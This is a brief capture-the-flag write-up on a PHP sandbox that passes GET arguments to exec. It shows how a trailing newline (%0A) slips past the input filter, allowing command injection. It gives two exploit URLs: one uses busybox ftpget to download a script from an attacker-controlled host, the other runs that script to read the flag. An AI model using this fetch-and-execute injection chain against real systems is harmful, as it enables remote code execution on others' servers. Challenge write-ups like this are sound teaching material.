The program creates a sandbox directory using the $_SERVER['REMOTE_ADDR'] (aka your IP address) if it doesn't exist already, and changes the directory into it. Then, it parses the GET parameter called args. The program iterates through $args array and verifies that they only contain letters, numbers and underscores.

However, it is possible to match with a string that ends with a new line (%0A). This allows us to inject custom shell commands when it does exec with our $args.


Exploit:
First, we run a shell command to download a shell script that we can execute later.

http://52.68.245.164/?args[]=aa%0a&args[]=busybox&args[]=ftpget&args[]=<IP_IN_DECIMAL>&args[]=script
Then, we run the downloaded script.

http://52.68.245.164/?args[]=aa%0a&args[]=sh&args[]=script
The shell script redirects output to a file which we can download by going to /sandbox/<YOUR_IP>. To get the flag, the script runs /read_flag.
